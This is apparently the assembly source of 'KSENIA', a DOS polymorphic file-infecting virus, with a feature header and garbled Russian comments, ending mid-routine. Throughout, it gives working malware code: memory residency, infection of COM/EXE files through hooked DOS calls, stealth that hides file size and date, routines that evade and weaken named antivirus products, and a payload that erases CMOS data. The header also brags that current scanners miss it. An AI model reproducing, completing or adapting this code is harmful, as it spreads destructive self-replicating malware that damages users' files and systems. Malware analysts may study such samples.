   ;  comment ê
   ;
   ;                 KSENIA Virus Version 1.0 Copyright (C) Deadman
   ;               ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;  TSR/COM/EXE fast polymorphic infector
   ;   Infects on 1857h/3Dh/41h/43h/4Bh/56h/6Ch/7141h/7143h/7156h/716Ch/71A9h
   ;      (Internal/Open/Del/Chmod/Exec/Ren/ExtOpen/LFNs/LFN Server Open)
   ;   Size/Date stealth on 11h/12h/4Eh/4Fh/5700h/5701h/714Eh/714Fh/71A6h
   ;      (Find First/Next FCB/DTA/LFN + Get/Set File Time/Date + Get Handle Info)
   ;   Redirection stealth on 3Fh/42h (Read/LSeek)
   ;   SFT stealth without using any SFT values (for Novell/Win95 compatibility)
   ;   Disinfects the host on 40h (Write)
   ;   Re-Hooks Int 21h vector after Win95 installation. Works perfectly!
   ;   Re-Hooks Int 21h vector if virus handler has been removed from the chain
   ;   Every second it calcucates CRC32 and erases CMOS if the CRC is incorrect
   ;   Virus stays resident in low memory, executing the host with 4B00h function
   ;   When some of AVs are executing, virus adds some parameters to cmdline
   ;   Polymorphic in files uses its internal polymorphic engine
   ;   Engine uses table-based instructions as a random size garbage (85% of 8086)
   ;   Engine uses different count and index registers
   ;   Generates different decryptors (ADD/SUB/XOR/NOT/NEG/ROR/ROL/INC/DEC imm8)
   ;   Has a second internal shield (secondary encrypts itself with a kewl method)
   ;   Will not infect files with a current hour stamp
   ;   Filenames with digits will not be infected
   ;   Will not infect AVP/DrWeb/Web/F-Prot/TB/ADInf/Clean/Scan/NOD/VSafe/Anti/NAV/FV/FindViru/Command
   ;   Disable stealth if PkZip/RAR/ARJ/LHA/ARC/DEFRAG/SPEEDISK/CHKDSK/BACKUP/MSBACKUP/ScanDisk/NDD are running
   ;   Intercepts Int 24h to disallow user be warned by a critial error message
   ;   Virus was analysed by these AVs
   ;       AVP 3.0.130 - No detection or warns
   ;       DRWEB 4.11  - No detection or warns
   ;       F-PROT 3.05 - No detection or warns
   ;
   ;                                  Deadman from hell. E-Mail: dman@mail.ru ê

    vsize  equ     eov-ksenia      ; ¤¨áª®¢ ï ¯ ¬ïâì ¤«ï ¢¨àãá 
    msize  equ     eom-ksenia      ; à §¬¥à ¯ ¬ïâ¨ âà¥¡ã¥¬®© ¢¨àãáã
    crlen  equ     256             ; à §¬¥à à áè¨äà®¢é¨ª 

    B      equ     <byte ptr>      ; ¥ª®â®àë¥ á®ªà é¥¨ï
    W      equ     <word ptr>
    D      equ     <dword ptr>

    mvs    macro   Seg1,Seg2       ; ¬ ªà®á
           push    Seg2            ; mvs es,cs -> push cs/pop es
           pop     Seg1
           endm

           model   tiny            ; ˜€*Š€
           codeseg
           p386
           org     100h
    ksenia:
           xor     bp,bp           ; ã¦® ¤«ï 1-£® § ¯ãáª  ¢¨àãá 
           call    crc             ; ¯®¤áç¥â CRC ¢¨àãá 
           cmp     checksum,eax    ; áà ¢¥¨¥ CRC32
           je      shield          ; íâ¨ CRLEN ¡ ©â § à¥§¥à¢¨à®¢ ë ¢ â¥«¥

           lea     di,r_crc
           mov     cx,4
    trans: rol     eax,8
           push    ax
           call    hex2a
           stosw
           pop     ax
           loop    trans

           mov     ah,9            ; ¢¨àãá  ¤«ï ¯®«¨¬®àä®£® à áè¨äà®¢é¨ª 
           lea     dx,badcrc
           int     21h
           mov     ax,4c02h
           int     21h

    hex2a: aam     10h
           add     ax,3030h
           cmp     al,':'
           jb      $+4
           add     al,7
           xchg    al,ah
           cmp     al,':'
           jb      $+4
           add     al,7
           ret

    badcrc db      'Virus code has been modified. The correct CRC is '
    r_crc  db      '00000000h',0dh,0ah,24h

           org     ksenia+CRLEN

           cld
           mov     ah,30h          ; § ¯à®á ¢¥àá¨¨ „Ž‘, ® íâ® â®«ìª® ¤«ï
           int     21h             ; ¢¨¤ã. *  á ¬®¬ ¤¥«¥ ¡¥à¥¬ ¨§ áâ¥ª 
    ip:    mov     bp,sp
           mov     bp,[bp-6]       ; á®åà ¥®¥ IP ª®¬ ¤®© INT ¨
           sub     bp,offset ip    ; ¢ëç¨á«ï¥¬ à §®áâì á¬¥é¥¨© (delta)

           push    ds 0ffffh       ; â ª ï ®¡«®¬ « í¬ã«ïâ®à web' 
           pop     ds
           mov     al,ds:[7]       ; ç¨â ¥¬ ¡ ©â ¨§ ROM
           pop     ds              ; ®¡ëç® ¢ íâ®¬ ¬¥áâ¥ åà ¨âáï ¤ â 
           xor     al,2fh          ; ¨ ¢¨àãá ç¨â ¥â slash ¨§ íâ®© ¤ âë
           cbw                     ; AX=00
           inc     ax              ; AX=01
           mov     dx,ax           ; DX=01

           lea     si,original-1+bp ; ¢â®à®¥ (¢ãâà¥¥¥) ª®«ìæ® § é¨âë ¢¨àãá 
           mov     cx,original-shield-1
    turbo: mov     al,cs:[si]      ; ªà âª ï áâàãªâãà :
           add     cs:[si-1],al    ; „Ž:    byte1 byte2 byte3 byte4
           sub     si,dx           ; *Ž‘‹…: b1+b2 b2+b3 b3+b4 b4+b5
           loop    turbo

    shield:
           mov     ax,1856h        ; ¯à®¢¥àª    ¯à¨áãâáâ¢¨¥ ¢¨àãá  ¢ ¯ ¬ïâ¨
           int     21h             ; AH=18 - ¯ãáâ ï äãªæ¨ï
           cmp     ax,3265h        ; AX=3265 - § ç¨â, çâ® ª®¯¨ï ¢¨àãá  ã¦¥ ¢
           jne     install         ; ¯ ¬ïâ¨

           lea     si,original+bp  ; si-á®åà ¥®¥  ç «® å®áâ 
           mov     ax,cs:[si]
           cmp     ax,'MZ'         ; ®âªã¤  § ¯ãáâ¨«¨ ¢¨àãá?
           je      run_exe         ; ¥á«¨  ç¨ ¥âáï   'MZ' ¨«¨ 'ZM'
           cmp     ax,'ZM'         ;  -> ¨§ EXE
           je      run_exe         ; ¨ ç¥ ¨§ ‘ŽŒ

           mov     di,0100h        ; áâ àâ®¢ «¨ ¨§ ‘ŽŒ
           mov     cx,32
           rep     movsb           ; ¢®ááâ ®¢¨âì ¢ ¯ ¬ïâ¨
           mov     si,100h         ;  ç «® § à ¦¥®£® ä ©« 
           mov     dx,cs
           jmp     restp

    run_exe:
           mov     ax,es
           add     ax,010h
           add     cs:[si+16h],ax  ; áâ à®¥ CS
           add     ax,cs:[si+0eh]  ; áâ à®¥ SS
           mov     dx,cs:[si+10h]  ; áâ à®¥ SP
           mov     ss,ax
           mov     sp,dx
           mov     dx,cs:[si+16h]  ; CS
           mov     si,cs:[si+14h]  ; IP

    restp: push    dx si
           xor     ax,ax           ; ¢®ááâ ®¢¨âì à¥£¨áâàë
           xor     bx,bx
           mov     cx,0ffh
           mov     dx,ds
           mov     di,sp
           add     di,4
           mov     bp,912h
           retf                    ; ®â¤ âì ã¯à ¢«¥¨¥ ¯à®£à ¬¬¥

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ˆáâ ««ïæ¨ï ¢¨àãá  ¢ ¯ ¬ïâì
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    install:
           mov     di,100h         ; ES:DI = PSP:0100
           mvs     ds,cs           ; DS:SI = ª®¤ ¢¨àãá 
           lea     si,ksenia+bp    ; ª®¯¨àã¥¬ ª®¤ ¢¨àãá  ¯®¢¥àå § à ¦¥®©
           mov     cx,msize        ; ¯à®£à ¬¬ë áà §ã ¯®á«¥ PSP
           db      6ah,00h         ; § £àã¦ ¥¬ ¢ áâ¥ª ª®¬ ¤ë ¤«ï
           db      66h,68h         ; ª®¯¨à®¢ ¨ï ¢¨àãá 
           db      0f3h,0a4h,0cah,6
           push    es offset done  ; rep movsb / retn 6
           mov     ax,sp
           add     ax,4
           cld
           jmp     far ptr ax

    done:  mov     ax,cs           ; ¬ë   ®¢®¬ ¬¥áâ¥, á ¯à ¢¨«ìë¬
           mov     ds,ax           ; á¬¥é¥¨¥¬, ª ª ¯à¨ ª®¬¯¨«ïæ¨¨
           mov     seg0,ax         ; § ¯®«¥¨¥ á¥£¬¥âëå ¯®«¥© ¢ EPB
           mov     seg1,ax
           mov     seg2,ax

           call    WinOldAp        ; ¯®«ãç¥¨¥ áâ âãá  ¨áâ ««ïæ¨¨ WinOldAp
           mov     w95state,ax     ; á®åà ¥¨¥ ä« ¦ª 

           mov     ax,3521h        ; AH=35 AL=INT# - äãªæ¨ï ¤«ï ¯®«ãç¥¨ï
           int     21h             ; ¢¥ªâ®à  ¯à¥àë¢ ¨ï AL
           mov     io21p,bx        ; á®åà ¨âì ¢¥ªâ®à ¢ ïç¥©ª¥ ¯ ¬ïâ¨
           mov     io21p+2,es
           call    set_dup         ; ãáâ ®¢¨âì 21-© ¢¥ªâ®à ¯à¥àë¢ ¨ï   ¤àã£®©
           mov     ax,2521h        ; ãáâ ®¢¨âì á¢®© ®¡à ¡®âç¨ª
           lea     dx,handler      ; ¯à¥àë¢ ¨ï
           int     21h
           mov     ax,3508h        ; § ¯à®á ¢¥ªâ®à  ¯à¥àë¢ ¨ï
           int     21h
           mov     io08,bx         ; á®åà ¥¨¥ ¢¥ªâ®à  ¢ ïç¥©ª å ¯ ¬ïâ¨
           mov     io08+2,es
           mov     ax,2508h        ; ãáâ ®¢ª  ¯à¥àë¢ ¨ï 08h (â ©¬¥à)
           lea     dx,vguard       ; ¤«ï ¯à®¢¥àª¨ æ¥«®áâ®áâ¨ ª®¤ 
           int     21h

           call    FixVirus        ; § à ¦¥¨¥ ¥ª®â®àëå ¢ ¦ëå ä ©«®¢

           mov     ah,4ah          ; ã¬¥ìè¨âì ¤® ã¦®£® à §¬¥à  ¡«®ª
           mov     bx,(msize+100h)/16+2 ; ¯ ¬ïâ¨, ¢ë¤¥«¥ë© ¯à®£à ¬¬¥
           mvs     es,cs
           int     21h

           mov     si,2ch          ; PSP:2Ch = á¥£¬¥â ®ªàã¦¥¨ï
           mov     ds,[si]         ; ¯®¬¥áâ¨âì ¥£® ¢ DS
           xor     ax,ax
           mov     si,-1

    escan: inc     si              ; áª ¨¬ ¯®ª  ¥  ©¤¥¬ DW 0
           cmp     W [si],ax       ; §  ¨¬ á«¥¤ã¥â ¨¬ï ä ©«  (¯à®£à ¬¬ë),
           jne     escan           ; ¨§ ª®â®à®© ¡ë« § ¯ãè¥ ¢¨àãá
           lea     dx,[si+4]       ; dx -> ¨¬ï

           mov     ax,cs           ; ¯à®¨¨æ¨ «¨§¨àã¥¬ áâ¥ª®¢ë¥ ãª § â¥«¨
           mov     ss,ax           ;   â® ®¨ ¡®«â îâáï £¤¥-â® ¢¨§ã //
           lea     sp,stacks+size stacks

           mov     ax,4b00h        ; § ¯ãáª ¥¬ ®á¨â¥«ï
           lea     bx,epb          ; ES:BX = EPB
           int     21h

           mov     si,2ch
           mov     es,cs:[si]      ; ¯®«ãç¥¨¥ á¥£¬¥â  ®ªàã¦¥¨ï
           mov     ah,49h          ; ®á¢®¡®¦¤¥¨¥ ¡«®ª  ¯ ¬ïâ¨
           int     21h

           mov     ax,cs           ; ¬ áª¨àã¥¬  è ¡«®ª ¯ ¬ïâ¨ â ª, ª ª ¡ã¤â®
           dec     ax              ; ® á®¤¥à¦¨â â®«ìª®  è PSP. € ¯®¤ á¥¡ï
           mov     ds,ax           ; ¯®áâà®¨¬ ¤àã£®© ¡«®ª ¯ ¬ïâ¨, á«¥¤ãîé¨©
           xor     si,si           ; ¯àï¬® §  PSP. *à¨ § ¢¥àè¥¨¨ ¯à®£à ¬¬ë
           mov     al,4dh          ;  è ¡«®ª ¯ ¬ïâ¨ ¥ ¡ã¤¥â ®á¢®¡®¦¥.
           xchg    B [si],al
           mov     W [si+3],0fh    ; * ¬ïâì ¯®¤ MCB  ¬ «î¡¥§® ¯à¥¤®áâ ¢«¥ 
           mov     B [si+100h],al  ; ª®¬ ¤®© áâà®ª®© (PSP+0F0h)
           mov     W [si+101h],8   ;
           mov     W [si+103h],msize/16+2

           mov     ah,4dh          ; AH=4Dh (WAIT)
           int     21h             ; ¯®«ãç¨âì ErrorLevel § ¯ãé¥®© ¯à®£à ¬¬ë
           mov     ah,4ch          ; AH=4Ch (EXIT)
           int     21h             ; ¢ë©â¨ ¢ DOS ¡¥§ ¢áïª¨å ¯®¤®§à¥¨©

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; Ž¡« áâì ¤ ëå
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

    copyright    db      'Ksenia.'
                 db      vsize/1000 mod 10+'0'
                 db      vsize/100  mod 10+'0'
                 db      vsize/10   mod 10+'0'
                 db      vsize      mod 10+'0'
                 db      ' Version 1.0 Copyright (C) by Deadman',0

    v_id         db      '[KSENIA/Deadman]',0
    ssize        equ     $-v_id

    extens       db      '.com',0  ; à áè¨à¥¨ï ä ©«®¢, ª®â®àë¥ ¬ë
                 db      '.exe',0  ; ¨ä¨æ¨àã¥¬
                 db      0

    prms         db      'DRWEB' ,0,0,' /NM'   ,0dh
                 db      'F-PROT',0,0,' /NOMEM',0dh
                 db      'AVP'   ,0,0,' /M'    ,0dh
                 db      0

    AVs          db      'AVP',0   ; ¨å ¢¨àãá âà®£ âì ¥ ¡ã¤¥â
                 db      'DrWeb',0
                 db      'Web',0
                 db      'F-Prot',0
                 db      'TB',0
                 db      'ADInf',0
                 db      'Clean',0
                 db      'Scan',0
                 db      'NOD',0
                 db      'VSafe',0
                 db      'Anti',0
                 db      'NAV',0
                 db      'FV',0
                 db      'FindViru',0
                 db      'Command',0
                 db      0

    windir       db      'WINBOOTDIR=',0,0
    comspec      db      'COMMAND',0,0

    fixes        db      '\SYSTEM\CONAGENT.EXE',0
                 db      '\COMMAND\MODE.COM',0
                 db      0

    stlock       db      'PkZip',0 ; ¯à®£à ¬¬ë, ¢® ¢à¥¬ï à ¡®âë ª®â®àëå
                 db      'RAR',0   ; ®âª«îç îâáï áâ¥«á-äãªæ¨¨ ¢¨àãá 
                 db      'ARJ',0
                 db      'LHA',0
                 db      'ARC',0
                 db      'ZOO',0
                 db      'DEFRAG',0
                 db      'SPEEDISK',0
                 db      'ChkDsk',0
                 db      'BACKUP',0
                 db      'MSBACKUP',0
                 db      'ScanDisk',0
                 db      'NDD',0
                 db      0

    funcs        dw      1856h,tsrtest     ; ¯à®¢¥àª  § à ¦¥®áâ¨ ¯ ¬ïâ¨ (NULL)
                 dw      4AFFh,rehook      ; re-¯¥à¥å¢ â ¢¥ªâ®à  (SETBLOCK)

                 dw      3DFFh,infect      ; § à ¦¥¨¥ (OPEN)
                 dw      1857h,infect      ; § à ¦¥¨¥ (VIXFIRUS)
                 dw      41FFh,infect      ; § à ¦¥¨¥ (DEL)
                 dw      43FFh,infect      ; § à ¦¥¨¥ (CHMOD)
                 dw      4BFFh,infect      ; § à ¦¥¨¥ (EXEC)
                 dw      56FFh,infect      ; § à ¦¥¨¥ (REN)
                 dw      6C00h,extinfect   ; § à ¦¥¨¥ (EXTOPEN)
                 dw      7141h,lfninfect   ; § à ¦¥¨¥ (LFN DEL)
                 dw      7143h,lfninfect   ; § à ¦¥¨¥ (LFN CHMOD)
                 dw      7156h,lfninfect   ; § à ¦¥¨¥ (LFN REN)
                 dw      716Ch,extlfninf   ; § à ¦¥¨¥ (LFN OPEN)
                 dw      71A9h,extlfninf   ; § à ¦¥¨¥ (LFN SERVER OPEN)

                 dw      11FFh,fcbstealth  ; áâ¥«á (FCB)
                 dw      12FFh,fcbstealth  ; áâ¥«á (FCB)
                 dw      4EFFh,dtastealth  ; áâ¥«á (DTA)
                 dw      4FFFh,dtastealth  ; áâ¥«á (DTA)
                 dw      714Eh,lfnstealth  ; áâ¥«á (LFN)
                 dw      714Fh,lfnstealth  ; áâ¥«á (LFN)
                 dw      71A6h,infstealth  ; áâ¥«á (LFN HANDLE INFO)
                 dw      5700h,date_get    ; áâ¥«á (GET DATE)
                 dw      5701h,date_set    ; áâ¥«á (SET DATE)
                 dw      42FFh,seekstealth ; áâ¥«á (LSEEK)
                 dw      3FFFh,readstealth ; áâ¥«á (READ)
                 dw      40FFh,diswrite    ; áâ¥«á (WRITE)

                 dw      3EFFh,patchsft    ; ª®àà¥ªâ¨à®¢ª  SFT
                 dw      44FFh,patchsft    ; ª®àà¥ªâ¨à®¢ª  SFT
                 dw      45FFh,patchsft    ; ª®àà¥ªâ¨à®¢ª  SFT
                 dw      46FFh,patchsft    ; ª®àà¥ªâ¨à®¢ª  SFT
                 dw      68FFh,patchsft    ; ª®àà¥ªâ¨à®¢ª  SFT
                 dw      0


   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; Ž¡à ¡®âç¨ª ¯à¥àë¢ ¨ï 08 (Virus Guard)
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    vguard:
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           inc     cs:delay        ; ¯à®¢¥àª  ¡ã¤¥â ¯à®¨áå®¤¨âì ¯à¨¬¥à®
           cmp     cs:delay,18     ; ª ¦¤ãî á¥ªã¤ã
           jb      exit_guard
           mov     cs:delay,0
           call    crc             ; ¯®¤áç¥â CRC â¥«ï ¢¨àãá 
           cmp     cs:checksum,eax ; áà ¢¥¨¥ ¥¥ á íâ «®®©
           jz      crc_ok

           mov     al,0ffh         ; § ¯à¥é¥¨¥ ¢á¥å ¯à¥àë¢ ¨©
           out     21h,al

           mov     cx,40h          ; § â¨à ¥¬ ¤ ë¥ CMOS
    cmos:  mov     ax,cx
           out     71h,al
           jmp     $+2
           out     70h,al
           loop    cmos
           jmp     $

    crc_ok:
           mov     ax,1856h        ; ¯à®¢¥àï¥¬, ¨ªâ® «¨ ¥ ¢ëª¨¤ë¢ «  è
           int     21h             ; ®¡à ¡®âç¨ª 21-£® ¯à¥àë¢ ¨ï ¨§ ®¡é¥©
           cmp     ax,3265h        ; æ¥¯¨?
           je      exit_guard

           mov     ax,3521h        ; § ¯à®á ¢¥ªâ®à  int 21h
           int     21h
           call    set_dup         ; ãáâ ®¢¨âì 21-© ¢¥ªâ®à ¯à¥àë¢ ¨ï   ¤àã£®©
           lea     dx,manager      ; §¤¥áì ã¦® ¯¥à¥ãáâ ®¢¨âì ¢¥ªâ®à
           call    chk_dup         ;  å®¤¨¬ ¬¥áâ®, ªã¤  ãª §ë¢ « ¢¥ªâ®à
           jnz     reset           ; ¢ ¯®á«¥¤¨¥ £®¤ë á¢®¥© ¦¨§¨
           lea     dx,handler
    reset: mov     ax,2521h        ; ¯¥à¥ãáâ  ¢«¨¢ ¥¬ ¢¥ªâ®à
           mvs     ds,cs
           int     21h

    exit_guard:
           call    LoadRegs
           jmp     d cs:io08

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; Ž¡à ¡®âç¨ª ¯à¥àë¢ ¨ï 21
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    handler:
           call    chk_dup         ; ¯à®¢¥àª , ¥ ¯¥à¥ãáâ ®¢¨«¨ «¨ ¢¥ªâ®à
           jz      manager         ; íâ® ¡ë¢ ¥â ¯®á«¥ § £àã§ª¨ Win95
           jmp     D cs:io21p      ; ¨ ç¥ ¬ë âãâ ¨ ¯à¨ ç¥¬

    manager:
           call    SaveRegs        ; á®åà ¨âì ¢á¥ à¥£¨áâàë

           mov     cs:save_ax,ax   ; á®®åà ¥¨¥ ¯ à ¬¥âà®¢
           mov     cs:save_bx,bx   ; ¡ã¤ãâ ¨á¯®«ì§®¢ âìáï (Filename), ¥á«¨
           mov     cs:save_es,es   ; äãªæ¨ï = 4b00 ¨ § ¯¯ãáª ¥¬ë© ä ©« - AV

           lea     si,funcs        ; ¥áâì â ¡«¨çª , ¯® ª®â®à®© ®¡à ¡ âë¢ îâáï
    fscan: cmp     ah,cs:[si+1]    ; ã¦ë¥ äãªæ¨¨ int 21 (db F#, dw offset)
           jne     lnext           ; áà ¢¨¢ ¥¬ al á â¥ªãé¥© ïç¥©ª®© â ¡«¨æë
           cmp     B cs:[si],0ffh  ; ¯à®¢¥àª    ¥ã¦®áâì ¯à®¢¥àª¨ ¯®¤äãªæ¨¨
           je      ljump
           cmp     B cs:[si],al    ; ¯à®¢¥àª  ¯®¤äãªæ¨¨
           jne     lnext

    ljump: call    mcbcheck        ; äãªæ¨ï  ©¤¥ : ¯à®¢¥àª  MCB (¤«ï stealth)
           push    W cs:[si+2]     ; ¡¥à¥¬ á¬¥é¥¨¥ ®¡à ¡®âç¨ª  ¤«ï äãªæ¨¨
           jmp     LoadRegs        ; ¢®ááâ  ¢«¨¢ ¥¬ à¥£¨áâàë

    lnext: add     si,4            ; ¡¥à¥¬ á«¥¤ãîéãî § ¯¨áì ¨§ â ¡«¨æë
           cmp     w cs:[si],0     ; ¯à®¢¥àª  ª®æ  â ¡«¨æë
           jnz     fscan
           call    LoadRegs        ; ®¡à ¡®âç¨ª ¤«ï íâ®© äãªæ¨¨ â ª ¨ ¥
           jmp     ExitHandler     ;  ©¤¥: ®â¤ ¥¬ ã¯à ¢«¥¨¥

    exithandler:
           push    ax ax es bx bp  ; á®åà ¥¨¥ ES:BX ¨ à¥§¥à¢¨à®¢ ¨¥ ¬¥áâ 
           call    get_dup         ; ¯®«ãç¥¨¥ ®à¨£¨ «ì®£® ¢¥ªâ®à  int 21h
           mov     bp,sp
           mov     [bp+6],bx       ; § ®á ¢¥ªâ®à  ¢ ¤¢¥ á¢®¡®¤ë¥ ïç¥©ª¨
           mov     [bp+8],es       ; ¢ áâ¥ª¥
           pop     bp bx es        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢ ES:BX
           retf                    ; ¯¥à¥¤ ç  ã¯à ¢«¥¨ï DOS

    ireturn:
           retf    2               ; ¢®§¢à â á ã¨çâ®¦¥¨¥¬ ä« £®¢ ¢ áâ¥ª¥

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ‡ à ¦¥¨¥ ä ©«®¢
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    extlfninf:
           call    SaveRegs        ; á®åà ¨âì ¢ áâ¥ª¥ à¥£¨áâàë
           mov     dx,si
           jmp     lfnbreak

    lfninfect:
           call    SaveRegs        ; á®åà ¨âì ¢ áâ¥ª¥ à¥£¨áâàë

    lfnbreak:
           call    Hook24          ; ãáâ ®¢ª  24-£® ¢¥ªâ®à  ¯à¥àë¢ ¨ï
           call    Filename        ; ¯à®¢¥àª  ¨¬¥¨ ¨ à áè¨à¥¨ï ä ©« 
           jc      noinf
           call    LFNClrAttrib    ; ®ç¨áâª   ââà¨¡ãâ®¢ ä ©« 
           jc      noinf
           call    LFNOpenFile     ; ®âªàëâ¨¥ ä ©«  ¤«ï R/W
           jc      LFNga
           call    Infect_Handle   ; ¨ä¨æ¨à®¢ ¨¥ handle
           call    CloseFile       ; § ªàëâ¨¥ ä ©« 
    LFNga: call    LFNRestAttrib   ; ¢®ááâ ®¢«¥¨¥  ââà¨¡ãâ®¢ ä ©« 
           jmp     noinf

    extinfect:
           call    SaveRegs        ; á®åà ¨âì ¢ áâ¥ª¥ à¥£¨áâàë
           mov     dx,si
           jmp     break
    infect:
           call    SaveRegs        ; á®åà ¨âì ¢ áâ¥ª¥ à¥£¨áâàë
    break: call    Hook24          ; ãáâ ®¢ª  24-£® ¢¥ªâ®à  ¯à¥àë¢ ¨ï
           call    Filename        ; ¯à®¢¥àª  ¨¬¥¨ ¨ à áè¨à¥¨ï ä ©« 
           jc      noinf
           call    ClrAttrib       ; ®ç¨áâª   ââà¨¡ãâ®¢ ä ©« 
           jc      noinf
           call    OpenFile        ; ®âªàëâ¨¥ ä ©«  ¤«ï R/W
           jc      RAttr
           call    Infect_Handle   ; ¨ä¨æ¨à®¢ ¨¥ handle
           call    CloseFile       ; § ªàëâ¨¥ ä ©« 
    Rattr: call    RestAttrib      ; ¢®ááâ ®¢«¥¨¥  ââà¨¡ãâ®¢ ä ©« 
    Noinf: call    Remove24        ; ¢®ááâ ®¢«¥¨¥ ®¡à ¡®âç¨ª  int 24h
           call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           cmp     ah,3dh
           je      sftstealth
           cmp     ax,6c00h
           je      sftstealth
           jmp     exithandler

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; SFT stealth
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    sftstealth:
           call    int21           ; ®âªàëâì ã¦ë© ä ©«
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           jc      no_sft
           xchg    ax,bx
           call    CloseSFT        ; § ªàëâì SFT
    no_sft:
           call    LoadRegs
           jmp     ireturn

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; FCB stealth
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    fcbstealth:
           call    int21           ; ¢ë§¢ âì äãªæ¨î DOS
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           cmp     al,0ffh         ;  ©¤¥® çâ®-¨¡ã¤ì?
           jz      no_fcb
           cmp     cs:stf,0        ; à ¡®â âì ¬®¦®?
           jnz     no_fcb
           cmp     cs:command,0    ; íâ® § ¯à®á command.com' ?
           jnz     no_fcb

           mov     ah,2fh          ; § ¯à®á  ¤à¥á  DTA
           call    int21
           cmp     B es:[bx],0ffh  ; à áè¨à¥®¥ FCB?
           jne     usual
           add     bx,7
    usual: lea     si,[bx+14h]     ; si -> ¤ â  ä ©« 
           lea     di,[bx+1Dh]     ; di -> ¤«¨  ä ©« 
           call    sizst           ; áªàëâ¨¥ «¨è¨å ¡ ©â
    no_fcb:
           call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           jmp     ireturn

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; DTA stealth
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    dtastealth:
           call    int21           ; ¢ë§¢ âì äãªæ¨î DOS
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           jc      no_dta          ;  è«¨?
           cmp     cs:stf,0        ; à ¡®â âì ¬®¦®?
           jnz     no_dta

           mov     ah,2fh          ; § ¯à®á  ¤à¥á  DTA
           call    int21
           lea     si,[bx+18h]     ; si -> ¤ â  ä ©« 
           lea     di,[bx+1ah]     ; di -> ¤«¨  ä ©« 
           call    sizst           ; áªàëâ¨¥ «¨è¨å ¡ ©â
    no_dta:
           call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           jmp     ireturn

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; Win95 stealth
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    infstealth:
           stc                     ; CF ¤®«¦¥ ¡ëâì ãáâ ®¢«¥
           call    int21           ; ¢ë§¢ âì äãªæ¨î DOS
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           jc      no_win          ; ¢á¥ ok?
           cmp     cs:stf,0        ; à ¡®â âì ¬®¦®?
           jnz     no_win
           mov     ax,0            ; ¢à¥¬ï ¢ Win95 ä®à¬ â¥
           mov     si,dx
           lea     di,[si+24h]     ; à §¬¥à ä ©« 
           lea     si,[si+14h]     ; ¤ â  ä ©« 
           mvs     es,ds
           jmp     allw95

    lfnstealth:
           call    int21           ; ¢ë§¢ âì äãªæ¨î DOS
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           jc      no_win          ;  è«¨?
           cmp     cs:stf,0        ; à ¡®â âì ¬®¦®?
           jnz     no_win
           mov     ax,si           ; ä®à¬ â ¢à¥¬¥¨
           lea     si,[di+14h]     ; ¤ â  ä ©« 
           lea     di,[di+20h]     ; à §¬¥à ä ©« 

    allw95:
           cmp     ax,1            ; ¯à®¢¥àª  ä®à¬ â  ¢à¥¬¥¨
           jz      dos_date

